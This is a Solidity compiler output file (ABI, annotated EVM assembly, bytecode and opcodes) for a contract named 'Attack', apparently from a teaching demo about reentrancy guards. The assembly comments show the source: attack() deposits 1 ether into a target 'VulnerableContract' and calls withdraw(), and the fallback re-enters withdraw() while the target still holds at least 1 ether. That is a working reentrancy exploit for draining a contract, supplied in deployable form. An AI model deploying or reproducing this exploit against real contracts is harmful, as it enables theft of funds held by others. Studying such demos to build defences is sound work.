{
	"secureContract(using reentrancy guard).sol": {
		"Attack": {
			"abi": [
				{
					"constant": true,
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"name": "",
							"type": "uint256"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": true,
					"inputs": [],
					"name": "exploit",
					"outputs": [
						{
							"name": "",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "view",
					"type": "function"
				},
				{
					"constant": false,
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"payable": true,
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"name": "_exploitAddress",
							"type": "address"
						}
					],
					"payable": false,
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"payable": true,
					"stateMutability": "payable",
					"type": "fallback"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"secureContract(using reentrancy guard).sol\":714:1296  contract Attack {\r... */\n  mstore(0x40, 0x80)\n    /* \"secureContract(using reentrancy guard).sol\":779:887  constructor(address _exploitAddress) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"secureContract(using reentrancy guard).sol\":779:887  constructor(address _exploitAddress) public {\r... */\n  pop\n  mload(0x40)\n  0x20\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  dup1\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"secureContract(using reentrancy guard).sol\":863:878  _exploitAddress */\n  dup1\n    /* \"secureContract(using reentrancy guard).sol\":834:841  exploit */\n  0x0\n  dup1\n    /* \"secureContract(using reentrancy guard).sol\":834:879  exploit = VulnerableContract(_exploitAddress) */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"secureContract(using reentrancy guard).sol\":779:887  constructor(address _exploitAddress) public {\r... */\n  pop\n    /* \"secureContract(using reentrancy guard).sol\":714:1296  contract Attack {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"secureContract(using reentrancy guard).sol\":714:1296  contract Attack {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x12065fe0\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x63d9b770\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n    tag_1:\n        /* \"secureContract(using reentrancy guard).sol\":966:973  1 ether */\n      0xde0b6b3a7640000\n        /* \"secureContract(using reentrancy guard).sol\":946:953  exploit */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"secureContract(using reentrancy guard).sol\":938:962  address(exploit).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"secureContract(using reentrancy guard).sol\":938:973  address(exploit).balance >= 1 ether */\n      lt\n      iszero\n        /* \"secureContract(using reentrancy guard).sol\":934:1020  if (address(exploit).balance >= 1 ether) {\r... */\n      iszero\n      tag_7\n      jumpi\n        /* \"secureContract(using reentrancy guard).sol\":990:997  exploit */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"secureContract(using reentrancy guard).sol\":990:1006  exploit.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"secureContract(using reentrancy guard).sol\":990:1008  exploit.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_8:\n        /* \"secureContract(using reentrancy guard).sol\":990:1008  exploit.withdraw() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_9:\n        /* \"secureContract(using reentrancy guard).sol\":990:1008  exploit.withdraw() */\n      pop\n      pop\n      pop\n      pop\n        /* \"secureContract(using reentrancy guard).sol\":934:1020  if (address(exploit).balance >= 1 ether) {\r... */\n    tag_7:\n        /* \"secureContract(using reentrancy guard).sol\":714:1296  contract Attack {\r... */\n      stop\n        /* \"secureContract(using reentrancy guard).sol\":1198:1293  function getBalance() public view returns(uint) {\r... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_10:\n        /* \"secureContract(using reentrancy guard).sol\":1198:1293  function getBalance() public view returns(uint) {\r... */\n      pop\n      tag_11\n      jump(tag_12)\n    tag_11:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"secureContract(using reentrancy guard).sol\":737:770  VulnerableContract public exploit */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_13:\n        /* \"secureContract(using reentrancy guard).sol\":737:770  VulnerableContract public exploit */\n      pop\n      tag_14\n      jump(tag_15)\n    tag_14:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"secureContract(using reentrancy guard).sol\":1035:1190  function attack() external payable {\r... */\n    tag_4:\n      tag_16\n      jump(tag_17)\n    tag_16:\n      stop\n        /* \"secureContract(using reentrancy guard).sol\":1198:1293  function getBalance() public view returns(uint) {\r... */\n    tag_12:\n        /* \"secureContract(using reentrancy guard).sol\":1240:1244  uint */\n      0x0\n        /* \"secureContract(using reentrancy guard).sol\":1272:1276  this */\n      address\n        /* \"secureContract(using reentrancy guard).sol\":1264:1285  address(this).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"secureContract(using reentrancy guard).sol\":1257:1285  return address(this).balance */\n      swap1\n      pop\n        /* \"secureContract(using reentrancy guard).sol\":1198:1293  function getBalance() public view returns(uint) {\r... */\n      swap1\n      jump\t// out\n        /* \"secureContract(using reentrancy guard).sol\":737:770  VulnerableContract public exploit */\n    tag_15:\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"secureContract(using reentrancy guard).sol\":1035:1190  function attack() external payable {\r... */\n    tag_17:\n        /* \"secureContract(using reentrancy guard).sol\":1102:1109  1 ether */\n      0xde0b6b3a7640000\n        /* \"secureContract(using reentrancy guard).sol\":1089:1098  msg.value */\n      callvalue\n        /* \"secureContract(using reentrancy guard).sol\":1089:1109  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"secureContract(using reentrancy guard).sol\":1081:1110  require(msg.value >= 1 ether) */\n      iszero\n      iszero\n      tag_20\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_20:\n        /* \"secureContract(using reentrancy guard).sol\":1121:1128  exploit */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"secureContract(using reentrancy guard).sol\":1121:1136  exploit.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"secureContract(using reentrancy guard).sol\":1143:1150  1 ether */\n      0xde0b6b3a7640000\n        /* \"secureContract(using reentrancy guard).sol\":1121:1153  exploit.deposit.value(1 ether)() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_21:\n        /* \"secureContract(using reentrancy guard).sol\":1121:1153  exploit.deposit.value(1 ether)() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_22:\n        /* \"secureContract(using reentrancy guard).sol\":1121:1153  exploit.deposit.value(1 ether)() */\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"secureContract(using reentrancy guard).sol\":1164:1171  exploit */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"secureContract(using reentrancy guard).sol\":1164:1180  exploit.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"secureContract(using reentrancy guard).sol\":1164:1182  exploit.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_23:\n        /* \"secureContract(using reentrancy guard).sol\":1164:1182  exploit.withdraw() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_24:\n        /* \"secureContract(using reentrancy guard).sol\":1164:1182  exploit.withdraw() */\n      pop\n      pop\n      pop\n      pop\n        /* \"secureContract(using reentrancy guard).sol\":1035:1190  function attack() external payable {\r... */\n      jump\t// out\n\n    auxdata: 0xa165627a7a7230582064914a6e9f2a7512e140c7bc49fafcc4e71e21812dbdd9441e50c882d09724900029\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405160208061041b83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610398806100836000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe01461014057806363d9b7701461016b5780639e5faafc146101c2575b670de0b6b3a76400006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163110151561013e576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561012557600080fd5b505af1158015610139573d6000803e3d6000fd5b505050505b005b34801561014c57600080fd5b506101556101cc565b6040518082815260200191505060405180910390f35b34801561017757600080fd5b506101806101eb565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101ca610210565b005b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a7640000341015151561022757600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b1580156102b457600080fd5b505af11580156102c8573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561035257600080fd5b505af1158015610366573d6000803e3d6000fd5b505050505600a165627a7a7230582064914a6e9f2a7512e140c7bc49fafcc4e71e21812dbdd9441e50c882d09724900029",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x41B DUP4 CODECOPY DUP2 ADD DUP1 PUSH1 0x40 MSTORE DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x398 DUP1 PUSH2 0x83 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x140 JUMPI DUP1 PUSH4 0x63D9B770 EQ PUSH2 0x16B JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x1C2 JUMPI JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT ISZERO ISZERO PUSH2 0x13E JUMPI PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x125 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x139 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x155 PUSH2 0x1CC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x177 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x180 PUSH2 0x1EB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1CA PUSH2 0x210 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO ISZERO ISZERO PUSH2 0x227 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2B4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2C8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x352 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x366 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 PUSH5 0x914A6E9F2A PUSH22 0x12E140C7BC49FAFCC4E71E21812DBDD9441E50C882D0 SWAP8 0x24 SWAP1 STOP 0x29 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "184000",
						"executionCost": "20579",
						"totalCost": "204579"
					},
					"external": {
						"": "infinite",
						"attack()": "infinite",
						"exploit()": "464",
						"getBalance()": "607"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"exploit()": "63d9b770",
					"getBalance()": "12065fe0"
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}